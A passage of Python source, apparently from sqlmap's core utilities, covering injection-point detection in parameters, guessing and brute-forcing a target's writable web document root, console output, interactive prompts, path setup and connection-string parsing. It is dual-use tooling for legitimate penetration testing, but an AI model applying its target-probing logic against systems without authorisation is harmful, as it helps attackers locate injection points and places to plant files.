re.finditer(r'(\\w+)[^\\w]*\"\\s*:[^\\w]*\\w*%s' % re.escape(CUSTOM_INJECTION_MARK_CHAR), testableParameters[parameter]):\n                                        key = match.group(1)\n                                        value = testableParameters[parameter].replace(match.group(0), match.group(0).replace(CUSTOM_INJECTION_MARK_CHAR, BOUNDED_INJECTION_MARKER))\n                                        candidates[\"%s (%s)\" % (parameter, key)] = re.sub(r\"\\b(%s\\s*=\\s*)%s\" % (re.escape(parameter), re.escape(testableParameters[parameter])), r\"\\g<1>%s\" % value, parameters)\n\n                                if not candidates:\n                                    deserialized = json.loads(testableParameters[parameter])\n                                    walk(deserialized)\n\n                                if candidates:\n                                    message = \"it appears that provided value for %sparameter '%s' \" % (\"%s \" % place if place != parameter else \"\", parameter)\n                                    message += \"is JSON deserializable. Do you want to inject inside? [y/N] \"\n\n                                    if readInput(message, default='N', boolean=True):\n                                        del testableParameters[parameter]\n                                        testableParameters.update(candidates)\n                                    break\n                            except (KeyboardInterrupt, SqlmapUserQuitException):\n                                raise\n                            except Exception:\n                                pass\n\n                            _ = re.sub(regex, r\"\\g<1>%s\\g<%d>\" % (kb.customInjectionMark, len(match.groups())), testableParameters[parameter])\n                            message = \"it appears that provided value for %sparameter '%s' \" % (\"%s \" % place if place != parameter else \"\", parameter)\n                            message += \"has boundaries. Do you want to inject inside? ('%s') [y/N] \" % getUnicode(_)\n\n                            if readInput(message, default='N', boolean=True):\n                                testableParameters[parameter] = re.sub(r\"\\b(%s\\s*=\\s*)%s\" % (re.escape(parameter), re.escape(testableParameters[parameter])), (r\"\\g<1>%s\" % re.sub(regex, r\"\\g<1>%s\\g<2>\" % BOUNDED_INJECTION_MARKER, testableParameters[parameter].replace(\"\\\\\", r\"\\\\\"))), parameters)\n                            break\n\n    if conf.testParameter:\n        if not testableParameters:\n            paramStr = \", \".join(test for test in conf.testParameter)\n\n            if len(conf.testParameter) > 1:\n                warnMsg = \"provided parameters '%s' \" % paramStr\n                warnMsg += \"are not inside the %s\" % place\n                logger.warning(warnMsg)\n            else:\n                parameter = conf.testParameter[0]\n\n                if not intersect(USER_AGENT_ALIASES + REFERER_ALIASES + HOST_ALIASES, parameter, True):\n                    debugMsg = \"provided parameter '%s' \" % paramStr\n                    debugMsg += \"is not inside the %s\" % place\n                    logger.debug(debugMsg)\n\n        elif len(conf.testParameter) != len(testableParameters):\n            for parameter in conf.testParameter:\n                if parameter not in testableParameters:\n                    debugMsg = \"provided parameter '%s' \" % parameter\n                    debugMsg += \"is not inside the %s\" % place\n                    logger.debug(debugMsg)\n\n    if testableParameters:\n        for parameter, value in testableParameters.items():\n            if value and not value.isdigit():\n                for encoding in (\"hex\", \"base64\"):\n                    try:\n                        decoded = codecs.decode(value, encoding)\n                        if len(decoded) > MIN_ENCODED_LEN_CHECK and all(_ in getBytes(string.printable) for _ in decoded):\n                            warnMsg = \"provided parameter '%s' \" % parameter\n                            warnMsg += \"appears to be '%s' encoded\" % encoding\n                            logger.warning(warnMsg)\n                            break\n                    except:\n                        pass\n\n    return testableParameters\n\ndef getManualDirectories():\n    directories = None\n    defaultDocRoot = DEFAULT_DOC_ROOTS.get(Backend.getOs(), DEFAULT_DOC_ROOTS[OS.LINUX])\n\n    if kb.absFilePaths:\n        for absFilePath in kb.absFilePaths:\n            if directories:\n                break\n\n            if directoryPath(absFilePath) == '/':\n                continue\n\n            absFilePath = normalizePath(absFilePath)\n            windowsDriveLetter = None\n\n            if isWindowsDriveLetterPath(absFilePath):\n                windowsDriveLetter, absFilePath = absFilePath[:2], absFilePath[2:]\n                absFilePath = ntToPosixSlashes(posixToNtSlashes(absFilePath))\n\n            for _ in list(GENERIC_DOC_ROOT_DIRECTORY_NAMES) + [conf.hostname]:\n                _ = \"/%s/\" % _\n\n                if _ in absFilePath:\n                    directories = \"%s%s\" % (absFilePath.split(_)[0], _)\n                    break\n\n            if not directories and conf.path.strip('/') and conf.path in absFilePath:\n                directories = absFilePath.split(conf.path)[0]\n\n            if directories and windowsDriveLetter:\n                directories = \"%s/%s\" % (windowsDriveLetter, ntToPosixSlashes(directories))\n\n    directories = normalizePath(directories)\n\n    if conf.webRoot:\n        directories = [conf.webRoot]\n        infoMsg = \"using '%s' as web server document root\" % conf.webRoot\n        logger.info(infoMsg)\n    elif directories:\n        infoMsg = \"retrieved the web server document root: '%s'\" % directories\n        logger.info(infoMsg)\n    else:\n        warnMsg = \"unable to automatically retrieve the web server \"\n        warnMsg += \"document root\"\n        logger.warning(warnMsg)\n\n        directories = []\n\n        message = \"what do you want to use for writable directory?\\n\"\n        message += \"[1] common location(s) ('%s') (default)\\n\" % \", \".join(root for root in defaultDocRoot)\n        message += \"[2] custom location(s)\\n\"\n        message += \"[3] custom directory list file\\n\"\n        message += \"[4] brute force search\"\n        choice = readInput(message, default='1')\n\n        if choice == '2':\n            message = \"please provide a comma separate list of absolute directory paths: \"\n            directories = readInput(message, default=\"\").split(',')\n        elif choice == '3':\n            message = \"what's the list file location?\\n\"\n            listPath = readInput(message, default=\"\")\n            checkFile(listPath)\n            directories = getFileItems(listPath)\n        elif choice == '4':\n            targets = set([conf.hostname])\n            _ = conf.hostname.split('.')\n\n            if _[0] == \"www\":\n                targets.add('.'.join(_[1:]))\n                targets.add('.'.join(_[1:-1]))\n            else:\n                targets.add('.'.join(_[:-1]))\n\n            targets = filterNone(targets)\n\n            for prefix in BRUTE_DOC_ROOT_PREFIXES.get(Backend.getOs(), DEFAULT_DOC_ROOTS[OS.LINUX]):\n                if BRUTE_DOC_ROOT_TARGET_MARK in prefix and re.match(IP_ADDRESS_REGEX, conf.hostname):\n                    continue\n\n                for suffix in BRUTE_DOC_ROOT_SUFFIXES:\n                    for target in targets:\n                        if not prefix.endswith(\"/%s\" % suffix):\n                            item = \"%s/%s\" % (prefix, suffix)\n                        else:\n                            item = prefix\n\n                        item = item.replace(BRUTE_DOC_ROOT_TARGET_MARK, target).replace(\"//\", '/').rstrip('/')\n                        if item not in directories:\n                            directories.append(item)\n\n                        if BRUTE_DOC_ROOT_TARGET_MARK not in prefix:\n                            break\n\n            infoMsg = \"using generated directory list: %s\" % ','.join(directories)\n            logger.info(infoMsg)\n\n            msg = \"use any additional custom directories [Enter for None]: \"\n            answer = readInput(msg)\n\n            if answer:\n                directories.extend(answer.split(','))\n\n        else:\n            directories = defaultDocRoot\n\n    return directories\n\ndef getAutoDirectories():\n    \"\"\"\n    >>> pushValue(kb.absFilePaths)\n    >>> kb.absFilePaths = [r\"C:\\\\inetpub\\\\wwwroot\\\\index.asp\", \"/var/www/html\"]\n    >>> getAutoDirectories()\n    ['C:/inetpub/wwwroot', '/var/www/html']\n    >>> kb.absFilePaths = popValue()\n    \"\"\"\n\n    retVal = OrderedSet()\n\n    if kb.absFilePaths:\n        infoMsg = \"retrieved web server absolute paths: \"\n        infoMsg += \"'%s'\" % \", \".join(ntToPosixSlashes(path) for path in kb.absFilePaths)\n        logger.info(infoMsg)\n\n        for absFilePath in kb.absFilePaths:\n            if absFilePath:\n                directory = directoryPath(absFilePath)\n                directory = ntToPosixSlashes(directory)\n                retVal.add(directory)\n    else:\n        warnMsg = \"unable to automatically parse any web server path\"\n        logger.warning(warnMsg)\n\n    return list(retVal)\n\ndef filePathToSafeString(filePath):\n    \"\"\"\n    Returns string representation of a given filepath safe for a single filename usage\n\n    >>> filePathToSafeString('C:/Windows/system32')\n    'C__Windows_system32'\n    \"\"\"\n\n    retVal = filePath.replace(\"/\", \"_\").replace(\"\\\\\", \"_\")\n    retVal = retVal.replace(\" \", \"_\").replace(\":\", \"_\")\n\n    return retVal\n\ndef singleTimeDebugMessage(message):\n    singleTimeLogMessage(message, logging.DEBUG)\n\ndef singleTimeWarnMessage(message):\n    singleTimeLogMessage(message, logging.WARN)\n\ndef singleTimeLogMessage(message, level=logging.INFO, flag=None):\n    if flag is None:\n        flag = hash(message)\n\n    if not conf.smokeTest and flag not in kb.singleLogFlags:\n        kb.singleLogFlags.add(flag)\n        logger.log(level, message)\n\ndef boldifyMessage(message, istty=None):\n    \"\"\"\n    Sets ANSI bold marking on entire message if parts found in predefined BOLD_PATTERNS\n\n    >>> boldifyMessage(\"Hello World\", istty=True)\n    'Hello World'\n\n    >>> boldifyMessage(\"GET parameter id is not injectable\", istty=True)\n    '\\\\x1b[1mGET parameter id is not injectable\\\\x1b[0m'\n    \"\"\"\n\n    retVal = message\n\n    if any(_ in message for _ in BOLD_PATTERNS):\n        retVal = setColor(message, bold=True, istty=istty)\n\n    return retVal\n\ndef setColor(message, color=None, bold=False, level=None, istty=None):\n    \"\"\"\n    Sets ANSI color codes\n\n    >>> setColor(\"Hello World\", color=\"red\", istty=True)\n    '\\\\x1b[31mHello World\\\\x1b[0m'\n    >>> setColor(\"[INFO] Hello World\", istty=True)\n    '[\\\\x1b[32mINFO\\\\x1b[0m] Hello World'\n    >>> setColor(\"[INFO] Hello [CRITICAL] World\", istty=True)\n    '[INFO] Hello [CRITICAL] World'\n    \"\"\"\n\n    retVal = message\n\n    if message:\n        if (IS_TTY or istty) and not conf.get(\"disableColoring\"):  # colorizing handler\n            if level is None:\n                levels = re.findall(r\"\\[(?P<result>%s)\\]\" % '|'.join(_[0] for _ in getPublicTypeMembers(LOGGING_LEVELS)), message)\n\n                if len(levels) == 1:\n                    level = levels[0]\n\n            if bold or color:\n                retVal = colored(message, color=color, on_color=None, attrs=(\"bold\",) if bold else None)\n            elif level:\n                try:\n                    level = getattr(logging, level, None)\n                except:\n                    level = None\n                retVal = LOGGER_HANDLER.colorize(message, level, True)\n            else:\n                match = re.search(r\"\\(([^)]*)\\s*fork\\)\", message)\n                if match:\n                    retVal = retVal.replace(match.group(1), colored(match.group(1), color=\"lightgrey\"))\n\n                if not any(_ in message for _ in (\"Payload: \",)):\n                    for match in re.finditer(r\"([^\\w])'([^\\n']+)'\", message):  # single-quoted (Note: watch-out for the banner)\n                        retVal = retVal.replace(match.group(0), \"%s'%s'\" % (match.group(1), colored(match.group(2), color=\"lightgrey\")))\n\n        message = message.strip()\n\n    return retVal\n\ndef clearColors(message):\n    \"\"\"\n    Clears ANSI color codes\n\n    >>> clearColors(\"\\x1b[38;5;82mHello \\x1b[38;5;198mWorld\")\n    'Hello World'\n    \"\"\"\n\n    retVal = message\n\n    if isinstance(message, str):\n        retVal = re.sub(r\"\\x1b\\[[\\d;]+m\", \"\", message)\n\n    return retVal\n\ndef dataToStdout(data, forceOutput=False, bold=False, contentType=None, status=CONTENT_STATUS.IN_PROGRESS, coloring=True):\n    \"\"\"\n    Writes text to the stdout (console) stream\n    \"\"\"\n\n    if not IS_TTY and isinstance(data, six.string_types) and data.startswith(\"\\r\"):\n        if re.search(r\"\\(\\d+%\\)\", data):\n            data = \"\"\n        else:\n            data = \"\\n%s\" % data.strip(\"\\r\")\n\n    if not kb.get(\"threadException\"):\n        if forceOutput or not (getCurrentThreadData().disableStdOut or kb.get(\"wizardMode\")):\n            multiThreadMode = kb.get(\"multiThreadMode\")\n            if multiThreadMode:\n                logging._acquireLock()\n\n            try:\n                if conf.get(\"api\"):\n                    sys.stdout.write(stdoutEncode(clearColors(data)), status, contentType)\n                else:\n                    sys.stdout.write(stdoutEncode(setColor(data, bold=bold) if coloring else clearColors(data)))\n            except IOError:\n                pass\n            except UnicodeEncodeError:\n                sys.stdout.write(re.sub(r\"[^ -~]\", '?', clearColors(data)))\n            finally:\n                try:\n                    sys.stdout.flush()\n                except IOError:\n                    raise SystemExit\n\n            if multiThreadMode:\n                logging._releaseLock()\n\n            kb.prependFlag = isinstance(data, six.string_types) and (len(data) == 1 and data not in ('\\n', '\\r') or len(data) > 2 and data[0] == '\\r' and data[-1] != '\\n')\n\ndef dataToTrafficFile(data):\n    if not conf.trafficFile:\n        return\n\n    try:\n        conf.trafficFP.write(data)\n        conf.trafficFP.flush()\n    except IOError as ex:\n        errMsg = \"something went wrong while trying \"\n        errMsg += \"to write to the traffic file '%s' ('%s')\" % (conf.trafficFile, getSafeExString(ex))\n        raise SqlmapSystemException(errMsg)\n\ndef dataToDumpFile(dumpFile, data):\n    try:\n        dumpFile.write(data)\n        dumpFile.flush()\n    except IOError as ex:\n        if \"No space left\" in getUnicode(ex):\n            errMsg = \"no space left on output device\"\n            logger.error(errMsg)\n        elif \"Permission denied\" in getUnicode(ex):\n            errMsg = \"permission denied when flushing dump data\"\n            logger.error(errMsg)\n        else:\n            errMsg = \"error occurred when writing dump data to file ('%s')\" % getUnicode(ex)\n            logger.error(errMsg)\n\ndef dataToOutFile(filename, data):\n    \"\"\"\n    Saves data to filename\n\n    >>> pushValue(conf.get(\"filePath\"))\n    >>> conf.filePath = tempfile.gettempdir()\n    >>> \"_etc_passwd\" in dataToOutFile(\"/etc/passwd\", b\":::*\")\n    True\n    >>> conf.filePath = popValue()\n    \"\"\"\n\n    retVal = None\n\n    if data:\n        while True:\n            retVal = os.path.join(conf.filePath, filePathToSafeString(filename))\n\n            try:\n                with open(retVal, \"w+b\") as f:  # has to stay as non-codecs because data is raw ASCII encoded data\n                    f.write(getBytes(data))\n            except UnicodeEncodeError as ex:\n                _ = normalizeUnicode(filename)\n                if filename != _:\n                    filename = _\n                else:\n                    errMsg = \"couldn't write to the \"\n                    errMsg += \"output file ('%s')\" % getSafeExString(ex)\n                    raise SqlmapGenericException(errMsg)\n            except IOError as ex:\n                errMsg = \"something went wrong while trying to write \"\n                errMsg += \"to the output file ('%s')\" % getSafeExString(ex)\n                raise SqlmapGenericException(errMsg)\n            else:\n                break\n\n    return retVal\n\ndef readInput(message, default=None, checkBatch=True, boolean=False):\n    \"\"\"\n    Reads input from terminal\n    \"\"\"\n\n    retVal = None\n\n    message = getUnicode(message)\n\n    if \"\\n\" in message:\n        message += \"%s> \" % (\"\\n\" if message.count(\"\\n\") > 1 else \"\")\n    elif message[-1] == ']':\n        message += \" \"\n\n    if kb.get(\"prependFlag\"):\n        message = \"\\n%s\" % message\n        kb.prependFlag = False\n\n    if conf.get(\"answers\"):\n        if not any(_ in conf.answers for _ in \",=\"):\n            return conf.answers\n\n        for item in conf.answers.split(','):\n            question = item.split('=')[0].strip()\n            answer = item.split('=')[1] if len(item.split('=')) > 1 else None\n            if answer and question.lower() in message.lower():\n                retVal = getUnicode(answer, UNICODE_ENCODING)\n            elif answer is None and retVal:\n                retVal = \"%s,%s\" % (retVal, getUnicode(item, UNICODE_ENCODING))\n\n    if message and IS_TTY:\n        message = \"\\r%s\" % message\n\n    if retVal:\n        dataToStdout(\"%s%s\\n\" % (message, retVal), forceOutput=not kb.wizardMode, bold=True)\n\n        debugMsg = \"used the given answer\"\n        logger.debug(debugMsg)\n\n    if retVal is None:\n        if checkBatch and conf.get(\"batch\") or any(conf.get(_) for _ in (\"api\", \"nonInteractive\")):\n            if isListLike(default):\n                options = ','.join(getUnicode(opt, UNICODE_ENCODING) for opt in default)\n            elif default:\n                options = getUnicode(default, UNICODE_ENCODING)\n            else:\n                options = six.text_type()\n\n            dataToStdout(\"%s%s\\n\" % (message, options), forceOutput=not kb.wizardMode, bold=True)\n\n            debugMsg = \"used the default behavior, running in batch mode\"\n            logger.debug(debugMsg)\n\n            retVal = default\n        else:\n            try:\n                logging._acquireLock()\n\n                if conf.get(\"beep\"):\n                    beep()\n\n                dataToStdout(\"%s\" % message, forceOutput=not kb.wizardMode, bold=True)\n                kb.prependFlag = False\n\n                retVal = _input()\n                if not retVal:  # Note: Python doesn't print newline on empty input\n                    dataToStdout(\"\\n\")\n                retVal = retVal.strip() or default\n                retVal = getUnicode(retVal, encoding=getattr(sys.stdin, \"encoding\", None)) if retVal else retVal\n            except:\n                try:\n                    time.sleep(0.05)  # Reference: http://www.gossamer-threads.com/lists/python/python/781893\n                except:\n                    pass\n                finally:\n                    kb.prependFlag = True\n                    raise SqlmapUserQuitException\n\n            finally:\n                logging._releaseLock()\n\n    if retVal and default and isinstance(default, six.string_types) and len(default) == 1:\n        retVal = retVal.strip()\n\n    if boolean:\n        retVal = retVal.strip().upper() == 'Y'\n    else:\n        retVal = retVal or \"\"\n\n    return retVal\n\ndef setTechnique(technique):\n    \"\"\"\n    Thread-safe setting of currently used technique (Note: dealing with cases of per-thread technique switching)\n    \"\"\"\n\n    getCurrentThreadData().technique = technique\n\ndef getTechnique():\n    \"\"\"\n    Thread-safe getting of currently used technique\n    \"\"\"\n\n    return getCurrentThreadData().technique or kb.get(\"technique\")\n\ndef randomRange(start=0, stop=1000, seed=None):\n    \"\"\"\n    Returns random integer value in given range\n\n    >>> random.seed(0)\n    >>> randomRange(1, 500)\n    152\n    \"\"\"\n\n    if seed is not None:\n        _ = getCurrentThreadData().random\n        _.seed(seed)\n        randint = _.randint\n    else:\n        randint = random.randint\n\n    return int(randint(start, stop))\n\ndef randomInt(length=4, seed=None):\n    \"\"\"\n    Returns random integer value with provided number of digits\n\n    >>> random.seed(0)\n    >>> randomInt(6)\n    963638\n    \"\"\"\n\n    if seed is not None:\n        _ = getCurrentThreadData().random\n        _.seed(seed)\n        choice = _.choice\n    else:\n        choice = random.choice\n\n    return int(\"\".join(choice(string.digits if _ != 0 else string.digits.replace('0', '')) for _ in xrange(0, length)))\n\ndef randomStr(length=4, lowercase=False, alphabet=None, seed=None):\n    \"\"\"\n    Returns random string value with provided number of characters\n\n    >>> random.seed(0)\n    >>> randomStr(6)\n    'FUPGpY'\n    \"\"\"\n\n    if seed is not None:\n        _random = getCurrentThreadData().random\n        _random.seed(seed)\n        choice = _random.choice\n    else:\n        choice = random.choice\n\n    if alphabet:\n        retVal = \"\".join(choice(alphabet) for _ in xrange(0, length))\n    elif lowercase:\n        retVal = \"\".join(choice(string.ascii_lowercase) for _ in xrange(0, length))\n    else:\n        retVal = \"\".join(choice(string.ascii_letters) for _ in xrange(0, length))\n\n    return retVal\n\ndef sanitizeStr(value):\n    \"\"\"\n    Sanitizes string value in respect to newline and line-feed characters\n\n    >>> sanitizeStr('foo\\\\n\\\\rbar') == 'foo bar'\n    True\n    >>> sanitizeStr(None) == 'None'\n    True\n    \"\"\"\n\n    return getUnicode(value).replace(\"\\n\", \" \").replace(\"\\r\", \"\")\n\ndef getHeader(headers, key):\n    \"\"\"\n    Returns header value ignoring the letter case\n\n    >>> getHeader({\"Foo\": \"bar\"}, \"foo\")\n    'bar'\n    \"\"\"\n\n    retVal = None\n\n    for header in (headers or {}):\n        if header.upper() == key.upper():\n            retVal = headers[header]\n            break\n\n    return retVal\n\ndef checkPipedInput():\n    \"\"\"\n    Checks whether input to program has been provided via standard input (e.g. cat /tmp/req.txt | python sqlmap.py -r -)\n    # Reference: https://stackoverflow.com/a/33873570\n    \"\"\"\n\n    return hasattr(sys.stdin, \"fileno\") and not os.isatty(sys.stdin.fileno())\n\ndef isZipFile(filename):\n    \"\"\"\n    Checks if file contains zip compressed content\n\n    >>> isZipFile(paths.WORDLIST)\n    True\n    \"\"\"\n\n    checkFile(filename)\n\n    with openFile(filename, \"rb\", encoding=None) as f:\n        header = f.read(len(ZIP_HEADER))\n\n    return header == ZIP_HEADER\n\ndef isDigit(value):\n    \"\"\"\n    Checks if provided (string) value consists of digits (Note: Python's isdigit() is problematic)\n\n    >>> u'\\xb2'.isdigit()\n    True\n    >>> isDigit(u'\\xb2')\n    False\n    >>> isDigit('123456')\n    True\n    >>> isDigit('3b3')\n    False\n    \"\"\"\n\n    return re.search(r\"\\A[0-9]+\\Z\", value or \"\") is not None\n\ndef checkFile(filename, raiseOnError=True):\n    \"\"\"\n    Checks for file existence and readability\n\n    >>> checkFile(__file__)\n    True\n    \"\"\"\n\n    valid = True\n\n    if filename:\n        filename = filename.strip('\"\\'')\n\n    if filename == STDIN_PIPE_DASH:\n        return checkPipedInput()\n    else:\n        try:\n            if filename is None or not os.path.isfile(filename):\n                valid = False\n        except:\n            valid = False\n\n        if valid:\n            try:\n                with open(filename, \"rb\"):\n                    pass\n            except:\n                valid = False\n\n    if not valid and raiseOnError:\n        raise SqlmapSystemException(\"unable to read file '%s'\" % filename)\n\n    return valid\n\ndef banner():\n    \"\"\"\n    This function prints sqlmap banner with its version\n    \"\"\"\n\n    if not any(_ in sys.argv for _ in (\"--version\", \"--api\")) and not conf.get(\"disableBanner\"):\n        result = BANNER\n\n        if not IS_TTY or any(_ in sys.argv for _ in (\"--disable-coloring\", \"--disable-colouring\")):\n            result = clearColors(result)\n        elif IS_WIN:\n            coloramainit()\n\n        dataToStdout(result, forceOutput=True)\n\ndef parseJson(content):\n    \"\"\"\n    This function parses POST_HINT.JSON and POST_HINT.JSON_LIKE content\n\n    >>> parseJson(\"{'id':1}\")[\"id\"] == 1\n    True\n    >>> parseJson('{\"id\":1}')[\"id\"] == 1\n    True\n    \"\"\"\n\n    quote = None\n    retVal = None\n\n    for regex in (r\"'[^']+'\\s*:\", r'\"[^\"]+\"\\s*:'):\n        match = re.search(regex, content)\n        if match:\n            quote = match.group(0)[0]\n\n    try:\n        if quote == '\"':\n            retVal = json.loads(content)\n        elif quote == \"'\":\n            content = content.replace('\"', '\\\\\"')\n            content = content.replace(\"\\\\'\", BOUNDARY_BACKSLASH_MARKER)\n            content = content.replace(\"'\", '\"')\n            content = content.replace(BOUNDARY_BACKSLASH_MARKER, \"'\")\n            retVal = json.loads(content)\n    except:\n        pass\n\n    return retVal\n\ndef parsePasswordHash(password):\n    \"\"\"\n    In case of Microsoft SQL Server password hash value is expanded to its components\n\n    >>> pushValue(kb.forcedDbms)\n    >>> kb.forcedDbms = DBMS.MSSQL\n    >>> \"salt: 4086ceb6\" in parsePasswordHash(\"0x01004086ceb60c90646a8ab9889fe3ed8e5c150b5460ece8425a\")\n    True\n    >>> kb.forcedDbms = popValue()\n    \"\"\"\n\n    blank = ' ' * 8\n\n    if isNoneValue(password) or password == ' ':\n        retVal = NULL\n    else:\n        retVal = password\n\n    if Backend.isDbms(DBMS.MSSQL) and retVal != NULL and isHexEncodedString(password):\n        retVal = \"%s\\n\" % password\n        retVal += \"%sheader: %s\\n\" % (blank, password[:6])\n        retVal += \"%ssalt: %s\\n\" % (blank, password[6:14])\n        retVal += \"%smixedcase: %s\\n\" % (blank, password[14:54])\n\n        if password[54:]:\n            retVal += \"%suppercase: %s\" % (blank, password[54:])\n\n    return retVal\n\ndef cleanQuery(query):\n    \"\"\"\n    Switch all SQL statement (alike) keywords to upper case\n\n    >>> cleanQuery(\"select id from users\")\n    'SELECT id FROM users'\n    \"\"\"\n\n    retVal = query\n\n    for sqlStatements in SQL_STATEMENTS.values():\n        for sqlStatement in sqlStatements:\n            candidate = sqlStatement.replace(\"(\", \"\").replace(\")\", \"\").strip()\n            queryMatch = re.search(r\"(?i)\\b(%s)\\b\" % candidate, query)\n\n            if queryMatch and \"sys_exec\" not in query:\n                retVal = retVal.replace(queryMatch.group(1), candidate.upper())\n\n    return retVal\n\ndef cleanReplaceUnicode(value):\n    \"\"\"\n    Cleans unicode for proper encode/decode\n\n    >>> cleanReplaceUnicode(['a', 'b'])\n    ['a', 'b']\n    \"\"\"\n\n    def clean(value):\n        return value.encode(UNICODE_ENCODING, errors=\"replace\").decode(UNICODE_ENCODING) if isinstance(value, six.text_type) else value\n\n    return applyFunctionRecursively(value, clean)\n\ndef setPaths(rootPath):\n    \"\"\"\n    Sets absolute paths for project directories and files\n    \"\"\"\n\n    paths.SQLMAP_ROOT_PATH = rootPath\n\n    # sqlmap paths\n    paths.SQLMAP_DATA_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"data\")\n    paths.SQLMAP_EXTRAS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"extra\")\n    paths.SQLMAP_SETTINGS_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"lib\", \"core\", \"settings.py\")\n    paths.SQLMAP_TAMPER_PATH = os.path.join(paths.SQLMAP_ROOT_PATH, \"tamper\")\n\n    paths.SQLMAP_PROCS_PATH = os.path.join(paths.SQLMAP_DATA_PATH, \"procs\")\n    paths.SQLMAP_SHELL_PATH = os.path.join(paths.SQLMAP_DATA_PATH, \"shell\")\n    paths.SQLMAP_TXT_PATH = os.path.join(paths.SQLMAP_DATA_PATH, \"txt\")\n    paths.SQLMAP_UDF_PATH = os.path.join(paths.SQLMAP_DATA_PATH, \"udf\")\n    paths.SQLMAP_XML_PATH = os.path.join(paths.SQLMAP_DATA_PATH, \"xml\")\n    paths.SQLMAP_XML_BANNER_PATH = os.path.join(paths.SQLMAP_XML_PATH, \"banner\")\n    paths.SQLMAP_XML_PAYLOADS_PATH = os.path.join(paths.SQLMAP_XML_PATH, \"payloads\")\n\n    # sqlmap files\n    paths.COMMON_COLUMNS = os.path.join(paths.SQLMAP_TXT_PATH, \"common-columns.txt\")\n    paths.COMMON_FILES = os.path.join(paths.SQLMAP_TXT_PATH, \"common-files.txt\")\n    paths.COMMON_TABLES = os.path.join(paths.SQLMAP_TXT_PATH, \"common-tables.txt\")\n    paths.COMMON_OUTPUTS = os.path.join(paths.SQLMAP_TXT_PATH, 'common-outputs.txt')\n    paths.DIGEST_FILE = os.path.join(paths.SQLMAP_TXT_PATH, \"sha256sums.txt\")\n    paths.SQL_KEYWORDS = os.path.join(paths.SQLMAP_TXT_PATH, \"keywords.txt\")\n    paths.SMALL_DICT = os.path.join(paths.SQLMAP_TXT_PATH, \"smalldict.txt\")\n    paths.USER_AGENTS = os.path.join(paths.SQLMAP_TXT_PATH, \"user-agents.txt\")\n    paths.WORDLIST = os.path.join(paths.SQLMAP_TXT_PATH, \"wordlist.tx_\")\n    paths.ERRORS_XML = os.path.join(paths.SQLMAP_XML_PATH, \"errors.xml\")\n    paths.BOUNDARIES_XML = os.path.join(paths.SQLMAP_XML_PATH, \"boundaries.xml\")\n    paths.QUERIES_XML = os.path.join(paths.SQLMAP_XML_PATH, \"queries.xml\")\n    paths.GENERIC_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"generic.xml\")\n    paths.MSSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"mssql.xml\")\n    paths.MYSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"mysql.xml\")\n    paths.ORACLE_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"oracle.xml\")\n    paths.PGSQL_XML = os.path.join(paths.SQLMAP_XML_BANNER_PATH, \"postgresql.xml\")\n\n    for path in paths.values():\n        if any(path.endswith(_) for _ in (\".txt\", \".xml\", \".tx_\")):\n            checkFile(path)\n\n    if IS_WIN:\n        # Reference: https://pureinfotech.com/list-environment-variables-windows-10/\n        if os.getenv(\"LOCALAPPDATA\"):\n            paths.SQLMAP_HOME_PATH = os.path.expandvars(\"%LOCALAPPDATA%\\\\sqlmap\")\n        elif os.getenv(\"USERPROFILE\"):\n            paths.SQLMAP_HOME_PATH = os.path.expandvars(\"%USERPROFILE%\\\\Local Settings\\\\sqlmap\")\n        else:\n            paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(\"~\")), \"sqlmap\")\n    else:\n        paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(\"~\")), \".sqlmap\")\n\n        if not os.path.isdir(paths.SQLMAP_HOME_PATH):\n            if \"XDG_DATA_HOME\" in os.environ:\n                paths.SQLMAP_HOME_PATH = os.path.join(os.environ[\"XDG_DATA_HOME\"], \"sqlmap\")\n            else:\n                paths.SQLMAP_HOME_PATH = os.path.join(os.path.expandvars(os.path.expanduser(\"~\")), \".local\", \"share\", \"sqlmap\")\n\n    paths.SQLMAP_OUTPUT_PATH = getUnicode(paths.get(\"SQLMAP_OUTPUT_PATH\", os.path.join(paths.SQLMAP_HOME_PATH, \"output\")), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)\n    paths.SQLMAP_DUMP_PATH = os.path.join(paths.SQLMAP_OUTPUT_PATH, \"%s\", \"dump\")\n    paths.SQLMAP_FILES_PATH = os.path.join(paths.SQLMAP_OUTPUT_PATH, \"%s\", \"files\")\n\n    # History files\n    paths.SQLMAP_HISTORY_PATH = getUnicode(os.path.join(paths.SQLMAP_HOME_PATH, \"history\"), encoding=sys.getfilesystemencoding() or UNICODE_ENCODING)\n    paths.API_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, \"api.hst\")\n    paths.OS_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, \"os.hst\")\n    paths.SQL_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, \"sql.hst\")\n    paths.SQLMAP_SHELL_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, \"sqlmap.hst\")\n    paths.GITHUB_HISTORY = os.path.join(paths.SQLMAP_HISTORY_PATH, \"github.hst\")\n\ndef weAreFrozen():\n    \"\"\"\n    Returns whether we are frozen via py2exe.\n    This will affect how we find out where we are located.\n\n    # Reference: http://www.py2exe.org/index.cgi/WhereAmI\n    \"\"\"\n\n    return hasattr(sys, \"frozen\")\n\ndef parseTargetDirect():\n    \"\"\"\n    Parse target dbms and set some attributes into the configuration singleton\n\n    >>> pushValue(conf.direct)\n    >>> conf.direct = \"mysql://root:testpass@127.0.0.1:3306/testdb\"\n    >>> parseTargetDirect()\n    >>> conf.dbmsDb\n    'testdb'\n    >>> conf.dbmsPass\n    'testpass'\n    >>> conf.direct = \"mysql://user:'P@ssw0rd'@127.0.0.1:3306/test\"\n    >>> parseTargetDirect()\n    >>> conf.dbmsPass\n    'P@ssw0rd'\n    >>> conf.hostname\n    '127.0.0.1'\n    >>> conf.direct = popValue()\n    \"\"\"\n\n    if not conf.direct:\n        return\n\n    details = None\n    remote = False\n\n    for dbms in SUPPORTED_DBMS:\n        details = 